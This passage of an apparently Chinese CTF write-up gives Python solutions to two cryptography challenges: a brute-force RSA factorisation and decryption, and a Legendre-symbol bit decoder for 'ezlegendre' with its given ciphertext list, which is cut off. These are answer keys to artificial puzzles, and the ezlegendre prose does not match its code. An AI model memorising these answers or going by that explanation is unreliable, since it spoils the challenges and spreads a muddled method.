gmpy2<br><br><span class="hljs-comment"># 给定的数值</span><br>n = <span class="hljs-number">141326884939079067429645084585831428717383389026212274986490638181168709713585245213459139281395768330637635670530286514361666351728405851224861268366256203851725349214834643460959210675733248662738509224865058748116797242931605149244469367508052164539306170883496415576116236739853057847265650027628600443901</span><br>c = <span class="hljs-number">47886145637416465474967586561554275347396273686722042112754589742652411190694422563845157055397690806283389102421131949492150512820301748529122456307491407924640312270962219946993529007414812671985960186335307490596107298906467618684990500775058344576523751336171093010950665199612378376864378029545530793597</span><br>e = <span class="hljs-number">65537</span><br><br><span class="hljs-comment"># 初始的 Brute Force 用于寻找 p 和 q</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">brute_force</span>(<span class="hljs-params">a, b, k</span>):<br>    <span class="hljs-keyword">if</span> k == <span class="hljs-number">256</span>:<br>        <span class="hljs-keyword">if</span> a * b == n:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;找到因子: a=<span class="hljs-subst">&#123;a&#125;</span>, b=<span class="hljs-subst">&#123;b&#125;</span>&#x27;</span>)<br>            <span class="hljs-keyword">return</span> a, b<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>            a1 = a + i * (<span class="hljs-number">2</span> ** (<span class="hljs-number">511</span> - k)) + j * (<span class="hljs-number">2</span> ** k)<br>            b1 = b + j * (<span class="hljs-number">2</span> ** (<span class="hljs-number">511</span> - k)) + i * (<span class="hljs-number">2</span> ** k)<br><br>            <span class="hljs-keyword">if</span> a1 * b1 &gt; n:<br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">if</span> (a1 + <span class="hljs-number">2</span> ** (<span class="hljs-number">511</span> - k)) * ((b1 + <span class="hljs-number">2</span> ** (<span class="hljs-number">511</span> - k))) &lt; n:<br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">if</span> (a1 * b1) % (<span class="hljs-number">2</span> ** (k + <span class="hljs-number">1</span>)) != n % (<span class="hljs-number">2</span> ** (k + <span class="hljs-number">1</span>)):<br>                <span class="hljs-keyword">continue</span><br><br>            result = brute_force(a1, b1, k + <span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">if</span> result:<br>                <span class="hljs-keyword">return</span> result<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><span class="hljs-comment"># 调用 Brute Force 函数来找到 p 和 q</span><br>p, q = brute_force(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># RSA 解密函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_rsa</span>(<span class="hljs-params">p, q, c, e</span>):<br>    <span class="hljs-comment"># 计算模数 n 和 Euler&#x27;s totient (phi)</span><br>    n = p * q<br>    phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br><br>    <span class="hljs-comment"># 计算私钥 d</span><br>    d = gmpy2.invert(e, phi)<br><br>    <span class="hljs-comment"># 使用私钥解密密文</span><br>    m = <span class="hljs-built_in">pow</span>(c, d, n)<br>    <span class="hljs-keyword">return</span> long_to_bytes(m)<br><br><span class="hljs-comment"># 解密并打印结果</span><br>plaintext = decrypt_rsa(p, q, c, e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;解密后的明文: <span class="hljs-subst">&#123;plaintext.decode()&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="ezlegendre"><a class="markdownIt-Anchor" href="#ezlegendre"></a> ezlegendre</h2><p>对于密文中的每个数字 n，我们计算 (n-a | p) 的勒让德符号。</p><p>如果勒让德符号为 1，则对应的原始比特为 1；否则为 0。</p><p>我们将所有解密出的比特拼接成一个二进制字符串。</p><p>最后，我们将二进制字符串每8位转换为一个ASCII字符，得到最终的明文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> legendre_symbol<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_flag</span>(<span class="hljs-params">ciphertext, p, a</span>):<br>    plaintext = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> ciphertext:<br>        <span class="hljs-comment"># 计算勒让德符号 (n|p) 和 (a|p)</span><br>        leg_n = legendre_symbol(n, p)<br>        leg_a = legendre_symbol(a, p)<br><br>        <span class="hljs-comment"># 如果 (n|p) == (a|p)，则原始比特为 0，否则为 1</span><br>        bit = <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">if</span> leg_n == leg_a <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;1&#x27;</span><br>        plaintext += bit<br><br>    <span class="hljs-comment"># 将二进制字符串转换为ASCII字符</span><br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(plaintext), <span class="hljs-number">8</span>):<br>        byte = plaintext[i:i + <span class="hljs-number">8</span>]<br>        flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(byte, <span class="hljs-number">2</span>))<br><br>    <span class="hljs-keyword">return</span> flag<br><br><br><span class="hljs-comment"># 给定的参数</span><br>p = <span class="hljs-number">303597842163255391032954159827039706827</span><br>a = <span class="hljs-number">34032839867482535877794289018590990371</span><br><br><span class="hljs-comment"># 从给定的输出中提取密文</span><br>ciphertext = [<span class="hljs-number">278121435714344315140568219459348432240</span>, <span class="hljs-number">122382422611852957172920716982592319058</span>, <span class="hljs-number">191849618185577692976529819600455462899</span>, <span class="hljs-number">94093446512724714011050732403953711672</span>, <span class="hljs-number">201558180013426239467911190374373975458</span>, <span class="hljs-number">68492033218601874497788216187574770779</span>, <span class="hljs-number">126947642955989000352009944664122898350</span>, <span class="hljs-number">219437945679126072290321638679586528971</span>, <span class="hljs-number">10408701004947909240690738287845627083</span>, <span class="hljs-number">219535988722666848383982192122753961</span>, <span class="hljs-number">173567637131203826362373646044183699942</span>, <span class="hljs-number">80338874032631996985988465309690317981</span>, <span class="hljs-number">61648326003245372053550369002454592176</span>, <span class="hljs-number">277054378705807456129952597025123788853</span>, <span class="hljs-number">17470857904503332214835106820566514388</span>, <span class="hljs-number">107319431827283329450772973114594535432</span>, <span class="hljs-number">238441423134995169136195506348909981918</span>, <span class="hljs-number">99883768658373018345315220015462465736</span>, <span class="hljs-number">188411315575174906660227928060309276647</span>, <span class="hljs-number">295943321241733900048293164549062087749</span>, <span class="hljs-number">262338278682686249081320491433984960912</span>, <span class="hljs-number">22801563060010960126532333242621361398</span>, <span class="hljs-number">36078000835066266368898887303720772866</span>, <span class="hljs-number">247425961449456125528957438120145449797</span>, <span class="hljs-number">843438089399946244829648514213686381</span>, <span class="hljs-number">134335534828960937622820717215822744145</span>, <span class="hljs-number">74167533116771086420478022805099354924</span>, <span class="hljs-number">249545124784428362766858349552876226287</span>, <span class="hljs-number">37282715721530125580150140869828301122</span>, <span class="hljs-number">196898478251078084893324399909636605522</span>, <span class="hljs-number">238696815190757698227115893728186526132</span>, <span class="hljs-number">299823696269712032566096751491934189084</span>, <span class="hljs-number">36767842703053676220422513310147909442</span>, <span class="hljs-number">281632109692842887259013724387076511623</span>, <span class="hljs-number">205224361514529735350420756653899454354</span>, <span class="hljs-number">129596988754151892987950536398173236050</span>, <span class="hljs-number">97446545236373291551224026108880226180</span>, <span class="hljs-number">14756086145599449889630210375543256004</span>, <span class="hljs-number">286168982698537894139229515711563677530</span>, <span class="hljs-number">100213185917356165383902831965625948491</span>, <span class="hljs-number">268158998117979449824644211372962370753</span>, <span class="hljs-number">264445941122079798432485452672458533870</span>, <span class="hljs-number">87798213581165493463875527911737074678</span>, <span class="hljs-number">131092115794704283915645135973964447801</span>, <span class="hljs-number">164706020771920540681638256590936188046</span>, <span class="hljs-number">178911145710348095185845690896985420147</span>, <span class="hljs-number">154776411353263771717768237918437437524</span>, <span class="hljs-number">260700611701259748940616668959555019434</span>, <span class="hljs-number">222035631087536380654643071679210307962</span>, <span class="hljs-number">281292430628313502184158157303993732703</span>, <span class="hljs-number">24585161817233257375093541076165757776</span>, <span class="hljs-number">269816384363209013058085915818661743171</span>, <span class="hljs-number">39975571110634682056180877801094873602</span>, <span class="hljs-number">125235869385356820424712474803526156473</span>, <span class="hljs-number">218090799597950517977618266111343968738</span>, <span class="hljs-number">144927096680470512196610409630841999788</span>, <span class="hljs-number">213811208492716237073777701143156745108</span>, <span class="hljs-number">64650890972496600196147221913475681291</span>, <span class="hljs-number">302694535366090904732833802133573214043</span>, <span class="hljs-number">214939649183312746702067838266793720455</span>, <span class="hljs-number">219122905927283854730628133811860801459</span>, <span class="hljs-number">224882607595640234803004206355378578645</span>, <span class="hljs-number">260797062521664439666117613111279885285</span>, <span class="hljs-number">279805661574982797810336125346375782066</span>, <span class="hljs-number">147173814739967617543091047462951522968</span>, <span class="hljs-number">23908277835281045050455945166237585493</span>, <span class="hljs-number">186338363482466926309454195056482648936</span>, <span class="hljs-number">295140548360506354817984847059061185817</span>, <span class="hljs-number">151948366859968493761034274719548683660</span>, <span class="hljs-number">96829048650546562162402357888582895187</span>, <span class="hljs-number">61129603762762161772506800496463804206</span>, <span class="hljs-number">83474322431616849774020088719454672415</span>, <span class="hljs-number">25094865151197136947956010155927090038</span>, <span class="hljs-number">86284568910378075382309315924388555908</span>, <span class="hljs-number">269311313874077441782483719283243368999</span>, <span class="hljs-number">293865655623484061732669067594899514872</span>, <span class="hljs-number">42618744258317592068586041005421369378</span>, <span class="hljs-number">54330626035773013687614797098120791595</span>, <span class="hljs-number">147903584483139198945881545544727290390</span>, <span class="hljs-number">290219451327796902155034830296135328101</span>, <span class="hljs-number">147951591390019765447087623264411247959</span>, <span class="hljs-number">176721307425594106045985172455880551666</span>, <span class="hljs-number">10617017342351249793850566048327751981</span>, <span class="hljs-number">166002147246002788729535202156354835048</span>, <span class="hljs-number">43653265786517886972591512103899543742</span>, <span class="hljs-number">191250321143079662898769478274249620839</span>, <span class="hljs-number">142288830015965036385306900781029447609</span>, <span class="hljs-number">231943053864301712428957240550789860578</span>, <span class="hljs-number">259705854206260213018172677443232515015</span>, <span class="hljs-number">42547692646223561211915772930251024103</span>, <span class="hljs-number">210863755365631055277867177762462471179</span>, <span class="hljs-number">140297326776889591830655052829600610449</span>, <span class="hljs-number">136970598261461830690726521708413303997</span>, <span class="hljs-number">93221970399798040564077738881047391445</span>, <span class="hljs-number">192314170920206027886439562261321846026</span>, <span class="hljs-number">95904582457122325051140875987053990027</span>, <span class="hljs-number">158334009503860664724416914265160737388</span>, <span class="hljs-number">134039922705083767606698907224295596883</span>, <span class="hljs-number">7789601161004867293103537392246577269</span>, <span class="hljs-number">261069289329878459425835380641261840913</span>, <span class="hljs-number">123743427894205417735664872035238090896</span>, <span class="hljs-number">20126583572929979071576315733108811761</span>, <span class="hljs-number">5317214299018099740195727361345674110</span>, <span class="hljs-number">68965882674411789667953455991785095270</span>, <span class="hljs-number">235934145208367401015357242228361016868</span>, <span class="hljs-number">250709310980093244562698210062174570956</span>, <span class="hljs-number">167048130489822745377277729681835553856</span>, <span class="hljs-number">122439593796334321806299678109589886368</span>, <span class="hljs-number">117953800124952553873241816859976377866</span>, <span class="hljs-number">226311466875372429157352019491582796620</span>, <span class="hljs-number">301401080214561977683439914412806833619</span>, <span class="hljs-number">255816105091394723475431389696875064495</span>, <span class="hljs-number">73243049441397892506665249226961409560</span>, <span class="hljs-number">226985189100195407227032930008331832009</span>, <span class="hljs-number">164462051705780513134747720427967016844</span>, <span class="hljs-number">97905180778488273557095248936896399883</span>, <span class="hljs-number">40737879120410802220891174679005117779</span>, <span class="hljs-number">180413920169781019749877067396006212488</span>, <span class="hljs-number">171309368917976988181007951396904157090</span>, <span class="hljs-number">215065878665354148046787050342635722874</span>, <span class="hljs-number">54225964222741166664978354789209176721</span>, <span class="hljs-number">179980445108969868669560591527220171967</span>, <span class="hljs-number">39118880593034932654127449293138635964</span>, <span class="hljs-number">170210538859699997092506207353260760212</span>, <span class="hljs-number">62152643864232748107111075535730424573</span>, <span class="hljs-number">28285579676042878568229909932560645217</span>, <span class="hljs-number">69823876778445954036922428013285910904</span>, <span class="hljs-number">170371231064701443428318684885998283021</span>, <span class="hljs-number">211884923965526285445904695039560930451</span>, <span class="hljs-number">2912793651373467597058997684762696593</span>, <span class="hljs-number">220544861190999177045275484705781090327</span>, <span class="hljs-number">142755270297166955179253470066788794096</span>, <span class="hljs-number">264271123927382232040584192781810655563</span>, <span class="hljs-number">214901195876112453126242978678182365781</span>, <span class="hljs-number">252916600207311996808457367909175218824</span>, <span class="hljs-number">176399700725319294248909617737135018444</span>, <span class="hljs-number">230677646264271256129104604724615560658</span>, <span class="hljs-number">1568101696521094800575010545520002520</span>, <span class="hljs-number">276644650735844694794889591823343917140</span>, <span class="hljs-number">185355461344975191330786362319126511681</span>, <span class="hljs-number">248497269558037476989199286642120676823</span>, <span class="hljs-number">27426372552503547932146407600438894266</span>, <span class="hljs-number">99885839446999373024614710052031031159</span>, <span class="hljs-number">238693364649026611386487480573211208980</span>, <span class="hljs-number">27047849084544903200283111147329657123</span>, <span class="hljs-number">261687609401872239323715016608713989139</span>, <span class="hljs-number">34926503987070847956303036393611830590</span>, <span class="hljs-number">252495954285655595492775877967398282722</span>, <span class="hljs-number">249358827602419141539353237669905281246</span>, <span class="hljs-number">42551212101869966935955269842854722856</span>, <span class="hljs-number">286527336123436427709115043975536071462</span>, <span class="hljs-number">158097411156207320921055042509886995091</span>, <span class="hljs-number">40982984899524424348979403377331335675</span>, <span class="hljs-number">87268254405858939730919659372073314983</span>, <span class="hljs-number">142920872841164853694746048293715385493</span>, <span class="hljs-number">280344634952903421792629929689092857993</span>, <span class="hljs-number">203584314487374069738101729666435007339</span>, <span class="hljs-number">76747904284507590577908045394001414841</span>, <span class="hljs-number">18608573158088521401404614102481693137</span>, <span class="hljs-number">104158289118605398449367221892619783009</span>, <span class="hljs-number">182616719368573751169836443225324741716</span>, <span class="hljs-number">272025723760783252166092979911587562064</span>, <span class="hljs-number">24194069309604403496494752448487752613</span>, <span class="hljs-number">71973842397785917741048132725314885345</span>, <span class="hljs-number">281558046604363121112749722271741416764</span>, <span class="hljs-number">66965324704079734796576428718112513855</span>, <span class="hljs-number">105222756356650324548621319241035836840</span>, <span class="hljs-number">331654051401420900830576011369146182</span>, <span class="hljs-number">131087815164777263900650262777429797113</span>, <span class="hljs-number">76104729920151139813274463849368737612</span>, <span class="hljs-number">163253554841934325278065946152769269296</span>, <span class="hljs-number">35973933431510942249046321254376084104</span>, <span class="hljs-number">223355354158871484030430212060934655984</span>, <span class="hljs-number">181704973473887713398031933516341967465</span>, <span class="hljs-number">131391458395622565487686089688656869743</span>, <span class="hljs-number">153029062510158353978320224242258979076</span>, <span class="hljs-number">75598349867958834632866616947240059419</span>, <span class="hljs-number">107656133091853571710502064573530657194</span>, <span class="hljs-number">261653899003034450454605322537555204702</span>, <span class="hljs-number">102387069931966536076616272953425585051</span>, <span class="hljs-number">174654548539988861301269811985320013260</span>, <span class="hljs-number">30731762585661721683653192240732246059</span>, <span class="hljs-number">265493340795853624586170054917042208660</span>, <span class="hljs-number">174818040730242275465453007894471517233</span>, <span class="hljs-number">99514915046145707535310601810631334278</span>, <span class="hljs-number">133978892607644700903700803642408771370</span>, <span class="hljs-number">216019770199630171637325931783378096100</span>, <span class="hljs-number">76687884966028369399497157007109898467</span>, <span class="hljs-number">262185741950606001987209986574269562289</span>, <span class="hljs-number">101935410844521914696784339882721918198</span>, <span class="hljs-number">85956270718878931834010975962772401589</span>, <span class="hljs-number">117578315837774870077915813512746446219</span>, <span class="hljs-number">209811226703488479967593762805568394383</span>, <span class="hljs-number">85782228978690599612110880989543246041</span>, <span class="hljs-number">234993402267259336147096170367513324439</span>, <span class="hljs-number">158487299348452041021565296682698871789</span>, <span class="hljs-number">159701431055714867184644360639841355076</span>, <span class="hljs-number">109022557288733938098734847159477770521</span>, <span class="hljs-number">20764822884655633017647117775843651332</span>, <span class="hljs-number">144987524936939260617020678038224835887</span>, <span class="hljs-number">214906746504968333094519539609226540495</span>, <span class="hljs-number">61852186870193663367998110214331582115</span>, <span class="hljs-number">90175894032076080713807606548780168998</span>, <span class="hljs-number">283504071501037047650569090140982777586</span>, <span class="hljs-number">267695305479884628857258564337611106120</span>, <span class="hljs-number">2466175482923380874813569827625743835</span>, <span class="hljs-number">62561740902965346823256447383892272796</span>, <span class="hljs-number">181458673990444296212252831090106274182</span>, <span class="hljs-number">151903421483215372136947284355251617709</span>, <span class="hljs-number">19545903652854510304023406921387221130</span>, <span class="hljs-number">219205004027218279279153442572018305650</span>, <span class="hljs-number">62495663621315535552427938857863551873</span>, <span class="hljs-number">12365469869484359722316573851483855865</span>, <span class="hljs-number">84444120685499458796249283893323932282</span>, <span class="hljs-number">240719245204462516267560756675192129462</span>, <span class="hljs-number">27868242791206675092288978266113368469</span>, <span class="hljs-number">231956104988320170956546781095814860314</span>, <span class="hljs-number">238410591787987745803829175586952288627</span>, <span class="hljs-number">290649141309468101840354611586699479851</span>, <span class="hljs-number">288298044918505512172272603794059992911</span>, <span class="hljs-number">43375655853069820305921366762777897508</span>, <span class="hljs-number">195308577786654489057887409352840304641</span>, <span class="hljs-number">184459971400898842809886506207633536394</span>, <span class="hljs-number">255884612697066296714973816950917234211</span>, <span class="hljs-number">8695922085804648269560669225439485137</span>, <span class="hljs-number">109407350389195091443836128149623969417</span>, <span class="hljs-number">40151058765649465408124869078260007620</span>, <span class="hljs-number">125484946058191366826510549493690011718</span>, <span class="hljs-number">71132588066103752922321942940739808864</span>, <span class="hljs-number">74434669478187680319595294456652807097</span>, <span class="hljs-number">187368213679294937718535073296853726111</span>, <span class="hljs-number">63461505676143678393259420949793811831</span>, <span class="hljs-number">131619805472714703711458729455838994067</span>, <span class="hljs-number">8579657158619864010437706463902003097</span>, <span class="hljs-number">60626278761876782233388469543817973673</span>, <span class="hljs-number">44776499706241603722632560896220653186</span>, <span class="hljs-number">257249861781237389988455384617803171877</span>, <span class="hljs-number">161899873165011719282095749671993720527</span>, <span class="hljs-number">73303482092538159761390536102771615311</span>, <span class="hljs-number">141674253732456103774983358188317473860</span>, <span class="hljs-number">112299149158347774069079224861237069975</span>, <span class="hljs-number">192409969047313867540459549167233638120</span>, <span class="hljs-number">52560717143548208264188844553309600513</span>, <span class="hljs-number">209294007943747095607573416682772182613</span>, <span class="hljs-number">65285862009539442533024037477398617382</span>, <span class="hljs-number">141465096635701758351979378177631042196</span>, <span class="hljs-number">282970656853503001128091562858564344839</span>, <span class="hljs-number">50475483578642585644452991078499278745</span>, <span class="hljs-number">162546597698227455939743094437394415689</span>, <span class="hljs-number">65258447920153625609456176138520078583</span>, <span class="hljs-number">25184730952052088803921023041299838584</span>, <span class="hljs-number">228883100940853988548836641050823478387</span>, <span class="hljs-number">234342509561041384559923481191578502671</span>, <span class="hljs-number">96929129863331626375704681481278825323</span>, <span class="hljs-number">288533470498072097357398960101692503873</span>, <span class="hljs-number">202238020435442160571930572760188491021</span>, <span class="hljs-number">179010548891454398845389500871076122861</span>, <span class="hljs-number">210509821764943794358893224681677583929</span>, <span class="hljs-number">301357944197101288505771002301759006254</span>, <span class="hljs-number">188933290023352627523422420332593360537</span>, <span class="hljs-number">207946655777875200521742190622482472884</span>, <span class="hljs-number">288626263488145443150622420747070805416</span>, <span class="hljs-number">75616301779108425588545170038742534166</span>, <span class="hljs-number">58163857263381687168244101022135667109</span>, <span class="hljs-number">297006021514663344215599115965804102114</span>, <span class="hljs-number">297690420826548736122127126645053452341</span>, <span class="hljs-number">88307045391242971429880119414942510712</span>, <span class="hljs-number">186427606153958359494215188169120285788</span>, <span class="hljs-number">135488686276533521058776859854524444361</span>, <span class="hljs-number">185380054960856211260651416683468161990</span>, <span class="hljs-number">175033658667416561573078028845860911744</span>, <span class="hljs-number">223026004671602541191897755812121342354</span>, <span class="hljs-number">34657268786986063209312902409995458857</span>, <span class="hljs-number">120560332690000675303295481174067849230</span>, <span class="hljs-number">55304621833927249516093996383526467671</span>, <span class="hljs-number">111480233798478730015825495041130765708</span>, <span class="hljs-number">188996716801525995463705449722399676888</span>, <span class="hljs-number">276300230605454487705048192796463035731</span>, <span class="hljs-number">195951365841304132244984630163178946841</span>, <span class="hljs-number">97383655947416522972353051984313703380</span>, <span class="hljs-number">94486945760999630041197414137963583839</span>, <span class="hljs-number">180706938513681126017333618518691884990</span>, <span class="hljs-number">291355503207799224380050183085704824037</span>, <span class="hljs-number">69034413486375685936282884707402207337</span>, <span class="hljs-number">147750870458026934714106830614187010708</span>, <span class="hljs-number">45030500748522416863096615057804736553</span>, <span class="hljs-number">242760053973560804002707125041520857401</span>, <span class="hljs-number">78549841097746795170488790352479728712</span>, <span class="hljs-number">2356186555504071026416878904180857750</span>, <span class="hljs-number">250486437623828232647064146324392061051</span>, <span class="hljs-number">23443836455198610186212360005846025976</span>, <span class="hljs-number">174557226633145985326629017377610499133</span>, <span class="hljs-number">105578481831185315088267357915446186040</span>, <span class="hljs-number">275620780071666328887795273613981325091</span>, <span class="hljs-number">23435505408737317601794562472269448966</span>, <span class="hljs-number">153209223406380813663608757935808571040</span>, <span class="hljs-number">298537417505667302508269715871007454162</span>, <span class="hljs-number">203833907122687718347615710181705388877</span>, <span class="hljs-number">41923370405573382737900061813058979798</span>, <span class="hljs-number">3762696947926387653032627637114050038</span>, <span class="hljs-number">201362054098012734707571348865729525585</span>, <span class="hljs-number">285561801443127226417656620776228615886</span>, <span class="hljs-number">111526376057659222252771678197929357387</span>, <span class="hljs-number">203857473647840873587593099562928738804</span>, <span class="hljs-number">44500972779851392967974092230683443589</span>, <span class="hljs-number">131565609415497588649207556985146740667</span>, <span class="hljs-number">118140388348838985266223643241117982200</span>, <span class="hljs-number">151449885527204880099343472664885565851</span>, <span class="hljs-number">296392921256617994387220911796693904909</span>, <span class="hljs-number">171323803851876663161606688343678019752</span>, <span class="hljs-number">77152982746512263077542395226111426871</span>, <span class="hljs-number">71648764903315646849225859605038798241</span>, <span class="hljs-number">204032734481806785543119754456569617316</span>, <span class="hljs-number">6308687907566364067313782129902290691</span>, <span class="hljs-number">16601010504475415688487155708691097587</span>, <span class="hljs-number">267844409827567109183739120606590016153</span>, <span class="hljs-number">8224746302136608660764206696943998066</span>, <span class="hljs-number">66759882079234093195284745682061177129</span>, <span class="hljs-number">246382951504754280882643835151081337286</span>, <span class="hljs-number">255668159720160142170457715248631352728</span>, <span class="hljs-number">198682585307670767869381177003851088434</span>, <span class="hljs-number">52435298055396076040371814840062860322</span>, <span class="hljs-number">71487031168170283085378067681578926209</span>, <span class="hljs-number">19270201008106231446848331516948751837</span>, <span class="hljs-number">259975200953378762173082382130139147342</span>, <span class="hljs-number">100957428421542421187997144087873975651</span>, <span class="hljs-number">208596806512779765020431672051552927799</span>, <span class="hljs-number">299145970783704112359526450087000033589</span>, <span class="hljs-number">150947534399996219237186223933189906692</span>, <span class="hljs-number">2048564430495506099844799218948689248</span>, <span class="hljs-number">18962488382754079143174369765373573160</span>, <span class="hljs-number">123031997265327646442638576943887737076</span>, <span class="hljs-number">244982544573374061178705105734141424990</span>, <span class="hljs-number">146410849043938910996544914770892579969</span>, <span class="hljs-number">223289253099676841267315311685506771609</span>, <span class="hljs-number">51374350072145272462874563304717832675</span>, <span class="hljs-number">11071799523780604861063183113721965515</span>, <span class="hljs-number">64879815349665030137608387728274669513</span>, <span class="hljs-number">80407660651138778640313857555610913997</span>, <span class="hljs-number">303240361297474032656368918727922343524</span>, <span class="hljs-number">103535171867293830164396688627880762056</span>, <span class="hljs-number">80560992291681297484967629700766125368</span>, <span class="hljs-number">143230791823232014720768325847406122476</span>, <span class="hljs-number">188716605362804777650654549500430035344</span>, <span class="hljs-number">232870220205325961834389425482865329315</span>, <span class="hljs-number">283584919111555062850512413920721407255</span>, <span class="hljs-number">206566027046056486360456937040463884619</span>, <span class="hljs-number">157265544558229360994066706355140059167</span>, <span class="hljs-number">234540100059557817987307855523008271441</span>, <span class="hljs-number">145080729935010940836509908225154438654</span>, <span class="hljs-number">87632901547252991486640361323948527297</span>, <span class="hljs-number">132851295075144433057295220850764336697</span>, <span class="hljs-number">119332580967710872282556206817561230364</span>, <span class="hljs-number">252662535367310697404410284791596079390</span>, <span class="hljs-number">116953597995893914045234747272641030589</span>, <span class="hljs-number">100249498080127826743176896590140549012</span>, <span class="hljs-number">136127222991007877469608037092253387587</span>, <span class="hljs-number">293872159333237281344632727438901916796</span>, <span class="hljs-number">188380258232793584033919525452891729603</span>, <span class="hljs-number">1610116068556601814921533488550773010</span>, <span class="hljs-number">227538093179017809788576278302184723209</span>, <span class="hljs-number">96083211912155805281570727244009758189</span>, <span class="hljs-number">177565192075026414675108774674272650977</span>, <span class="hljs-number">48610376097473152433617435307712235835</span>, <span class="hljs-number">247706157308906487216795222963091222950</span>, <span class="hljs-number">158089460554439410339817265377357657075</span>, <span class="hljs-number">242596743543458727108836420358578527964</span>, <span class="hljs-number">157838486547678450498998359338995593594</span>, <span class="hljs-number">154936428786673098370270244313756793764</span>, <span class="hljs-number">230069001282099253337070315838992422706</span>, <span class="hljs-number">302203905412042965194022309363722872023</span>, <span class="hljs-number">278925578180003228386990239779184911424</span>, <span class="hljs-number">2121847168422140085785053284950978779</span>, <span class="hljs-number">88186566913792352545205577594300112005</span>, <span class="hljs-number">127051055548524716972172930848069016819</span>, <span class="hljs-number">216775577660712694343189516378309335187</span>, <span class="hljs-number">44934779747684486400910901018161470888</span>, <span class="hljs-number">32429597712898788634301884219187226083</span>, <span class="hljs-number">219683174528279300995710495669083670544</span>, <span class="hljs-number">37001671152735870067433052249003677244</span>, <span class="hljs-number">40408367335919429215031155701333780256</span>, <span class="hljs-number">156957056705864208022145617831060134907</span>, <span class="hljs-number">180077610045061934161783737112285900966</span>, <span class="hljs-number">59357544819520045255625797086421901884</span>, <span class="hljs-number">77751400794807935281264495346525107329</span>, <span class="hljs-number">4517615764752715802675887411287287137</span>, <span class="hljs-number">76319782726782483955139757169428276003</span>, <span class="hljs-number">176009402215469456144386392247781430661</span>, <span class="hljs-number">283055695252017869386094188584670242363</span>, <span class="hljs-number">20001716567499724882317501875143788088</span>, <span class="hljs-number">125228382132280749989067609697418628387</span>, <span class="hljs-number">144053090751393640875176862167012247830</span>, <span class="hljs-number">15289106046221987660093620422889539867</span>, <span class="hljs-number">111243866573605033251079958638430165633</span>, <span class="hljs-number">169264885994758018612038619809803723688</span>, <span class="hljs-number">11895954311759483419234457833286931577</span>, <span class="hljs-number">273147053963507607445612310063799123998</span>, <span class="hljs-number">158981773284803069491507978382595811562</span>, <span class="hljs-number">41293513794446810141896116395025053234</span>, <span class="hljs-number">57441237860743029006005815967510568612</span>, <span class="hljs-number">109171476551418034153338841133917497633</span>, <span class="hljs-number">136539712287056106151501004438585146777</span>, <span class="hljs-number">278918550892367788720071091355436733468</span>, <span class="hljs-number">211360251223022250021398148918837686812</span>, <span class="hljs-number">254351242496347083009146404917085951637</span>, <span class="hljs-number">130260153203964833202474997491055897705</span>, <span class="hljs-number">221930288825889900517852991745469270910</span>, <span class="hljs-number">66354211799382156899053592476719001842</span>, <span class="hljs-number">127898620670768976254134750731374490934</span>, <span class="hljs-number">298131830425274848646460016809595859328</span>, <span class="hljs-number">132109510144911727511061804395381822418</span>, <span class="hljs-number">210917766469026421985352121201196497206</span>, <span class="hljs-number">5441137715689271309917542693016936841</span>, <span class="hljs-number">209516950406881264617228336887254107528</span>, <span class="hljs-number">92275151703152148383106907311559718841</span>, <span class="hljs-number">46255650973652148247469464088017660080</span>, <span class="hljs-number">182628529221607295465655096378164148336</span>, <span class="hljs-number">52574278547120304143820897608762444985</span>, <span class="hljs-number">63698472804719856407197390836793525437</span>, <span class="hljs-number">30457182690865024857724004613999433676</span>, <span class="hljs-number">212073418196280214618461610817423630022</span>, <span class="hljs-number">48875930775858981513092672396243080640</span>, <span class="hljs-number">113234797533868946026347891158142991388</span>, <span class="hljs-number">256534108458875318962058222544020064164</span>, <span class="hljs-number">22522715662428558833985333846937440705</span>, <span class="hljs-number">97553118958308509177643330175409499003</span>, <span class="hljs-number">197088081433425221073434635573357125592</span>, <span class="hljs-number">157303116668734020456228309942188293059</span>, <span class="hljs-number">110316346669278795114546305726864504681</span>, <span class="hljs-number">228887397917708007004920589862367347873</span>, <span class="hljs-number">112210930213921962308944716344585917343</span>, <span class="hljs-number">95017760786235266842788931502689331157</span>, <span class="hljs-number">303479014347753799316861720146531596843</span>, <span class="hljs-number">138677197920058856282155251074088437081</span>, <span 